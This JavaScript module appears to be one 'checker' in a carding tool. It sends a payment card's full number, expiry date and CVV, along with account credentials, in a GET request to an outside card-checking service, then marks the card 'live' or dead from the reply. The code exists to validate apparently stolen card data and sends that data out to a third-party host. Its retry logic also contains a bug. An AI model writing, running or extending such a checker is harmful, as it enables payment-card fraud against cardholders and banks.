const { getConfig } = require('../../configManager')
const request = require('request-promise')

module.exports = async function azkabancenter(
  card,
  currentRetrys = 0
) {
  const { retrys, azkabancenter: configs } = getConfig('checkers')

  try {
    const options = {
      url: `https://azkabancenter.online/azkabandev.php?usuario=${configs.user}&senha=${configs.pass}&testador=${configs.tester}&lista=${card.number}|${card.month}|${card.year}|${card.cvv}`,
      method: 'GET',
      timeout: 100000,
    }

    const response = JSON.parse(await request(options))

    console.log(response)

    if (currentRetrys >= parseInt(retrys))
      return {
        active: true,
        live: false,
        skip: true,
        output: response,
      }

    if (response?.success) {
      return {
        live: true,
        active: true,
        output: response,
      }
    } else if (response?.success == false) {
      return {
        live: false,
        active: true,
        output: response,
      }
    } else if (response?.error) {
      currentRetrys++
      return azkabancenter(card, retrys)
    }
  } catch (e) {
    return {
      active: false,
      output: e.message,
    }
  }
}
